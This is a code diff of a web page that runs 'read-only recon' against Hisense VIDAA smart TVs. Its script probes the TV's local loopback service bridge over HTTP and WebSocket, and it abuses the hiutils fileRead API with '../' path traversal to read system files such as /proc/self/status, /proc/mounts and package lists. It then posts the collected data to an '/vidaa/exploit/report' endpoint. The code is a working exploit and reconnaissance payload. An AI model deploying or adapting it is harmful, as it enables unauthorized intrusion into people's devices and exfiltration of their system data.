@@ -2,170 +2,202 @@
 <html>
 <head><meta charset="utf-8"><title>VIDAA recon (read-only)</title>
 <style>
-body{background:#000;color:#0f0;font:30px/1.5 monospace;margin:1em;}
-#st{font-size:40px;color:#ff0;} #det{color:#9f9;} .bad{color:#f66;}
+body{background:#000;color:#0f0;font:26px/1.4 monospace;margin:.6em;}
+#st{font-size:36px;color:#ff0;white-space:pre-wrap;} #det{color:#9f9;white-space:pre-wrap;} .bad{color:#f66;}
 </style>
 </head>
 <body>
 <div id="st">VIDAA RECON: starting...</div>
 <div id="det"></div>
 <script>
-/* READ-ONLY recon. Hard service/API allowlist: only tvinfo.initialData,
-   hiutils.getOSVersion/getVersionStatus/fileRead, pkgmgr.getInstalledPkgs.
-   No download-to-TV APIs, no setters, no writes. */
+/* READ-ONLY recon (v2, browser-verified framing).
+   Hard service/API allowlist: tvinfo.initialData, hiutils.getOSVersion /
+   getVersionStatus / fileRead, pkgmgr.getInstalledPkgs, and one FaaS
+   service start (basic/fetcher) as a reachability probe only.
+   No download-to-TV, no setters, no writes. */
 (function () {
-  var R = { phase: "recon", t: new Date().toISOString(), ua: navigator.userAgent,
-            url: location.href, bridge_http: {}, wss9888: null, sdk: {}, services: {},
-            fileread_variant: null, reads: {}, bridge_globals: {}, tvinfo_setters: null,
-            tvinfo_fn_names: null, pkglist_trunc: null, errors: [] };
+  "use strict";
+  var R = { phase: "recon2", t: new Date().toISOString(), ua: navigator.userAgent,
+            url: location.href, get_reach: {}, ws_start: [], http_svc: {},
+            fileread_variant: null, reads: {}, services: {},
+            bridge_globals: {}, hisense_fns: null, errors: [] };
   function det(s) { var d = document.getElementById("det"); d.innerHTML += s + "<br>"; }
   function st(s) { document.getElementById("st").textContent = s; }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+  function js(v) { try { return JSON.stringify(v).slice(0, 300); } catch (e) { return String(v).slice(0, 300); } }
 
-  var SVC_ALLOW = { tvinfo: ["initialData"], hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
+  var SVC_ALLOW = { tvinfo: ["initialData"],
+                    hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
                     pkgmgr: ["getInstalledPkgs"] };
-  var sess = 700;
+  var START_ALLOW = ["basic/fetcher"]; /* start probe only; never any file-transfer api */
+  var BASES = ["http://localhost:9009", "http://127.0.0.1:9009",
+               "https://localhost:9888", "https://127.0.0.1:9888"];
 
-  function phx(base, name, api, args) {
-    if (!(SVC_ALLOW[name] && SVC_ALLOW[name].indexOf(api) >= 0)) { R.errors.push("blocked:" + name + "." + api); return null; }
-    var body = JSON.stringify({ path: "phoenix://service/" + name, method: "callAPI",
-      parameters: { api: api, args: JSON.stringify(args === undefined ? "" : args) },
-      session: ++sess, timeout: 6, identifier: "" });
-    try {
-      var x = new XMLHttpRequest();
-      x.open("POST", base + "service/" + name, false); /* sync XHR like vendor SDK */
-      x.setRequestHeader("content-type", "text/plain"); /* simple POST, no preflight */
-      x.send(body);
-      var txt = (x.responseText || "").slice(0, 2000);
-      try { return JSON.parse(txt); } catch (e) { return { raw: txt, status: x.status }; }
-    } catch (e) { return { xhr_error: String(e) }; }
+  /* 1. loopback reachability: no-cors GET. Opaque response = server answered
+     (CORS hides body, proves TCP+HTTP); TypeError = refused/unreachable. */
+  function getReach(base) {
+    return fetch(base + "/", { mode: "no-cors" }).then(function (r) {
+      return { reachable: true, note: "opaque " + (r && r.type) };
+    }).catch(function (e) {
+      return { reachable: false, err: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 120) };
+    });
   }
 
-  function pickBase() {
-    /* Try loopback transports; return base URL string or null. */
-    var cands = ["http://localhost:9009/", "https://localhost:9888/"];
-    for (var i = 0; i < cands.length; i++) {
-      var r = phx(cands[i], "tvinfo", "initialData", "");
-      var ok = r && (r.ret === true || r.raw || (r.xhr_error && String(r.xhr_error).indexOf("Network") < 0));
-      R.bridge_http[cands[i] === cands[0] ? "9009" : "9888"] = r && r.xhr_error ? "ERR " + r.xhr_error : (r ? "answering" : "null");
-      if (r && r.ret === true) { R.services.initialData = r.msg; return cands[i]; }
-      if (r && (r.raw || r.status !== undefined)) { R.services["initialData@" + cands[i]] = r; }
+  /* 2. service call over HTTP exactly as community-verified pages do it:
+     POST /service/<svc>, content-type json, identifier header, {api,args}. */
+  function httpCall(base, svc, api, args, ms) {
+    if (!(SVC_ALLOW[svc] && SVC_ALLOW[svc].indexOf(api) >= 0)) {
+      R.errors.push("blocked:" + svc + "." + api);
+      return Promise.resolve({ blocked: true });
     }
-    return null;
+    var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
+    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 4000);
+    return fetch(base + "/service/" + svc, {
+      method: "POST",
+      headers: { "content-type": "application/json", "identifier": "" },
+      body: JSON.stringify({ api: api, args: args === undefined ? "" : args }),
+      signal: ctrl ? ctrl.signal : undefined
+    }).then(function (r) {
+      return r.text().then(function (t) { clearTimeout(timer); return { status: r.status, text: t.slice(0, 2000) }; });
+    }).catch(function (e) {
+      clearTimeout(timer);
+      return { fetchError: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 160) };
+    });
   }
 
-  function tryWss() {
-    try {
-      var ws = new WebSocket("wss://localhost:9888/");
-      ws.onopen = function () { R.wss9888 = "open"; };
-      ws.onerror = function () { R.wss9888 = R.wss9888 || "error(self-signed/expected?)"; };
-      setTimeout(function () { try { ws.close(); } catch (e) {} }, 3000);
-    } catch (e) { R.wss9888 = "throw " + e; }
+  function parsed(r) {
+    if (r && typeof r.text === "string") { try { return JSON.parse(r.text); } catch (e) {} }
+    return r;
+  }
+  function isOk(r) { return !!(r && r.ret === true); }
+
+  /* 3. WS service-start probe (wss then ws, both hosts). Collects frames. */
+  function wsStart(schemeHost, ms) {
+    return new Promise(function (resolve) {
+      var ws, done = false, frames = [];
+      function fin(o) { if (done) return; done = true; if (o.frames === undefined) o.frames = frames;
+        try { if (ws) ws.close(); } catch (e) {} resolve(o); }
+      try { ws = new WebSocket(schemeHost); } catch (e) { return fin({ target: schemeHost, opened: false, exc: String(e) }); }
+      ws.onopen = function () {
+        try { ws.send(JSON.stringify({ path: "phoenix://service/" + START_ALLOW[0], method: "start",
+                                       parameters: {}, session: 901, timeout: 10 })); } catch (e) {}
+        setTimeout(function () { fin({ target: schemeHost, opened: true }); }, ms || 1600);
+      };
+      ws.onmessage = function (m) { if (frames.length < 6) frames.push(String(m.data).slice(0, 250)); };
+      ws.onerror = function () { fin({ target: schemeHost, opened: false, err: "ws error" }); };
+      ws.onclose = function (c) { fin({ target: schemeHost, opened: false, err: "closed " + c.code }); };
+      setTimeout(function () { fin({ target: schemeHost, opened: false, err: "timeout" }); }, 6000);
+    });
   }
 
   function probeGlobals() {
-    var names = ["TvInfo_getParam", "TvInfo_setParam", "vowOS", "omi_platform", "HiUtils_createRequest",
-                 "Hisense_SetPictureMode", "Hisense_GetPictureModeList", "Hisense_SetVolume"];
-    for (var i = 0; i < names.length; i++) { try { R.bridge_globals[names[i]] = typeof window[names[i]]; } catch (e) { R.bridge_globals[names[i]] = "err"; } }
-    try {
-      if (window.vowOS && window.vowOS.tvinfo) {
-        R.tvinfo_fn_names = Object.keys(window.vowOS.tvinfo);
-        R.tvinfo_setters = R.tvinfo_fn_names.filter(function (f) { return f.indexOf("set") === 0; });
-      }
-      if (window.vowOS && window.vowOS.service) R.sdk.vowos_service_keys = Object.keys(window.vowOS.service);
-    } catch (e) { R.errors.push("globals:" + e); }
-  }
-
-  function trySdk() {
-    try {
-      if (window.vowOS && window.vowOS.service && typeof window.vowOS.service.syncExecute === "function") {
-        R.sdk.syncExecute_tvinfo = window.vowOS.service.syncExecute("tvinfo", { api: "initialData", args: "" });
-        if (!R.services.initialData && R.sdk.syncExecute_tvinfo) R.services.initialData = R.sdk.syncExecute_tvinfo.msg;
-        if (R.sdk.syncExecute_tvinfo && R.sdk.syncExecute_tvinfo.msg && R.sdk.syncExecute_tvinfo.msg.chipsetName)
-          R.sdk.works = true;
-      }
-    } catch (e) { R.sdk.error = String(e); }
-  }
-
-  function fileread(base, pathVal) { return phx(base, "hiutils", "fileRead", { path: pathVal }); }
-
-  function probeFileRead(base) {
-    var variants = [
-      { v: "array", p: ["../proc/uptime"] },
-      { v: "string-rel", p: "../proc/uptime" },
-      { v: "array-abs", p: ["/proc/uptime"] },
-      { v: "string-abs", p: "/proc/uptime" }
-    ];
-    var good = null;
-    for (var i = 0; i < variants.length; i++) {
-      var r = fileread(base, variants[i].p);
-      R.reads["VARIANT:" + variants[i].v] = { ok: r && r.ret === true ? String(r.msg).slice(0, 200) : null, resp: r };
-      if (r && r.ret === true && !good) { good = variants[i].v; R.fileread_variant = variants[i].v; }
+    var names = ["HiUtils_createRequest", "TvInfo_getParam", "vowOS", "omi_platform",
+                 "WebSDK_createFileRequest", "Hisense_SetPictureMode"];
+    for (var i = 0; i < names.length; i++) {
+      try { R.bridge_globals[names[i]] = typeof window[names[i]]; } catch (e) { R.bridge_globals[names[i]] = "err"; }
     }
-    var wrap = function (p) {
-      if (R.fileread_variant === "array") return [p];
-      if (R.fileread_variant === "array-abs") return [p];
-      return p.replace(/^\.\.\//, "");
-    };
-    if (!good) return;
-    var targets = ["../proc/version", "../proc/self/status", "../proc/mounts", "../proc/net/unix",
-                   "../var/run/superwatch_socket", "../var/local",
-                   "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
-                   "../OAD/AppUpgradeSwitch.json"];
-    for (var j = 0; j < targets.length; j++) {
-      var res = fileread(base, wrap(targets[j]));
-      var m = res ? (typeof res.msg === "string" ? res.msg : JSON.stringify(res.msg)) : "";
-      if (targets[j] === "../proc/net/unix") {
-        var lines = (m || "").split("\n").filter(function (l) { return l.indexOf("superwatch") >= 0; });
-        res = { filtered_lines: lines, total_lines: (m || "").split("\n").length };
-        m = JSON.stringify(res);
-      }
-      if (targets[j] === "../proc/self/status") {
-        var keep = (m || "").split("\n").filter(function (l) { return /^(Uid|Gid|Groups|Name):/.test(l); });
-        m = keep.join(" | ") || m;
-      }
-      R.reads[targets[j]] = { ok: res && res.ret === true ? String(m).slice(0, 1500) : null,
-                              err: res && res.ret === false ? JSON.stringify(res.msg).slice(0, 300) : (res ? JSON.stringify(res).slice(0, 300) : null) };
+    try {
+      R.hisense_fns = Object.keys(window).filter(function (k) { return k.indexOf("Hisense_") === 0; }).length;
+    } catch (e) { R.hisense_fns = "err"; }
+  }
+
+  var READ_TARGETS = ["../proc/uptime", "../proc/version", "../proc/self/status",
+                      "../proc/mounts", "../proc/net/unix",
+                      "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
+                      "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];
+
+  function filterContent(path, content) {
+    if (typeof content !== "string") return content;
+    if (path === "../proc/self/status") {
+      return content.split("\n").filter(function (l) { return /^(Name|Uid|Gid|Groups):/.test(l); }).join(" | ");
+    }
+    if (path === "../proc/mounts") {
+      return content.split("\n").filter(function (l) { return l.indexOf(" rw,") >= 0; }).join(" | ").slice(0, 1200);
+    }
+    if (path === "../proc/net/unix") {
+      return content.split("\n").filter(function (l) { return l.indexOf("superwatch") >= 0; }).join(" | ") || "no superwatch lines";
+    }
+    return content.slice(0, 1400);
+  }
+
+  async function probeFileRead(base, form) {
+    for (var j = 0; j < READ_TARGETS.length; j++) {
+      var path = READ_TARGETS[j];
+      var args = (form === "array") ? { mode: 6, path: [path] } : { mode: 6, path: path };
+      var res = parsed(await httpCall(base, "hiutils", "fileRead", args, 5000));
+      if (isOk(res)) R.reads[path] = { ok: filterContent(path, res.msg), via: form + "@" + base };
+      else R.reads[path] = { err: js(res).slice(0, 220), via: form + "@" + base };
+      det("read " + path + " -> " + (isOk(res) ? "OK" : "fail"));
     }
   }
 
-  function probeExtra(base) {
-    try {
-      var x = new XMLHttpRequest(); x.open("GET", base + "service/basic/fetcher", false); x.send(null);
-      R.services["GET service/basic/fetcher"] = { status: x.status, body: (x.responseText || "").slice(0, 300) };
-    } catch (e) { R.services["GET service/basic/fetcher"] = "ERR " + e; }
-    var pk = phx(base, "pkgmgr", "getInstalledPkgs", "");
-    if (pk && pk.ret === true) {
-      var list = pk.msg || [];
-      R.pkglist_trunc = { count: list.length,
-        has_jsservice_basic: list.some ? list.some(function (p) { return String(p.name).indexOf("jsservice.basic") >= 0; }) : ("jsservice.basic" in list),
-        sample: JSON.stringify(list).slice(0, 1200) };
-    } else R.pkglist_trunc = pk;
-    var os = phx(base, "hiutils", "getOSVersion", "");
-    R.services.getOSVersion = os;
+  async function httpProbe() {
+    /* variant discovery on /proc/uptime first (string vs one-element array) */
+    for (var b = 0; b < BASES.length; b++) {
+      var base = BASES[b];
+      var os = parsed(await httpCall(base, "hiutils", "getOSVersion", "", 4000));
+      var id = parsed(await httpCall(base, "tvinfo", "initialData", "", 4000));
+      var vstr = parsed(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: "../proc/uptime" }, 4000));
+      var varr = parsed(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: ["../proc/uptime"] }, 4000));
+      R.http_svc[base] = {
+        getOSVersion: isOk(os) ? String(os.msg).slice(0, 120) : js(os),
+        initialData: isOk(id) ? "OK" : js(id),
+        read_string: isOk(vstr) ? String(vstr.msg).slice(0, 60) : js(vstr),
+        read_array: isOk(varr) ? String(varr.msg).slice(0, 60) : js(varr)
+      };
+      det("base " + base + ": os=" + R.http_svc[base].getOSVersion + " id=" + R.http_svc[base].initialData);
+      if (isOk(id) && !R.services.initialData) R.services.initialData = id.msg;
+      var form = null;
+      if (isOk(varr)) form = "array"; else if (isOk(vstr)) form = "string";
+      if (form && !R.fileread_variant) {
+        R.fileread_variant = form;
+        R.reads["../proc/uptime"] = { ok: String(parsed(form === "array" ? varr : vstr).msg).slice(0, 200), via: form + "@" + base };
+        await probeFileRead(base, form);
+        return;
+      }
+      if (isOk(os) || isOk(id)) {
+        /* bridge answers but fileRead failed on both forms here: try other fileRead-only info, keep scanning */
+        continue;
+      }
+    }
+  }
+
+  async function run() {
+    st("VIDAA RECON: running...");
+    probeGlobals();
+    for (var g = 0; g < BASES.length; g++) R.get_reach[BASES[g]] = await getReach(BASES[g]);
+    det("reach: " + js(R.get_reach));
+    var opened = false;
+    var wsTargets = ["wss://localhost:9888", "ws://localhost:9888", "wss://127.0.0.1:9888", "ws://127.0.0.1:9888"];
+    for (var w = 0; w < wsTargets.length && !opened; w++) {
+      var a = await wsStart(wsTargets[w]);
+      R.ws_start.push(a);
+      det("ws " + a.target + " opened=" + a.opened);
+      opened = a.opened;
+    }
+    await httpProbe();
+    var pkg = parsed(await httpCall(Object.keys(R.http_svc)[0] || BASES[0], "pkgmgr", "getInstalledPkgs", "", 5000));
+    if (isOk(pkg)) {
+      var list = pkg.msg || [];
+      R.pkglist_trunc = { count: list.length || 0,
+        has_jsservice_basic: (list.some ? list.some(function (p) { return String(p.name || p).indexOf("jsservice.basic") >= 0; }) : false),
+        sample: js(list).slice(0, 900) };
+    } else R.pkglist_trunc = pkg;
+    if (!R.fileread_variant && !R.services.initialData && !opened) R.errors.push("no phoenix transport reachable from page");
+    st("VIDAA RECON: done - sending report...");
+    report();
   }
 
   function report() {
-    st("VIDAA RECON: done - sending report...");
-    try {
-      var x = new XMLHttpRequest();
-      x.open("POST", "/vidaa/exploit/report", true);
-      x.setRequestHeader("content-type", "text/plain");
-      x.onload = function () { st("VIDAA RECON: REPORT DELIVERED (http " + x.status + ")"); };
-      x.onerror = function () { st("VIDAA RECON: SEND FAILED - copy URL bar + console"); R.errors.push("report send failed"); };
-      x.send(JSON.stringify(R));
-    } catch (e) { st("VIDAA RECON: SEND ERROR " + e); }
+    var body = JSON.stringify(R);
+    fetch("/vidaa/exploit/report", { method: "POST", headers: { "content-type": "application/json" }, body: body })
+      .then(function (r) { st("VIDAA RECON: REPORT DELIVERED (http " + r.status + ")"); })
+      .catch(function () {
+        st("VIDAA RECON: SEND FAILED - copy URL bar + console");
+        R.errors.push("report send failed");
+      });
   }
 
-  function run() {
-    st("VIDAA RECON: running...");
-    tryWss(); probeGlobals(); trySdk();
-    var base = pickBase();
-    det("transport: " + JSON.stringify(R.bridge_http));
-    if (base) { probeFileRead(base); probeExtra(base); }
-    else R.errors.push("no phoenix transport reachable from page");
-    det("fileRead variant: " + R.fileread_variant);
-    report();
-  }
   if (document.readyState === "complete" || document.readyState === "interactive") run();
   else document.addEventListener("DOMContentLoaded", run);
 })();
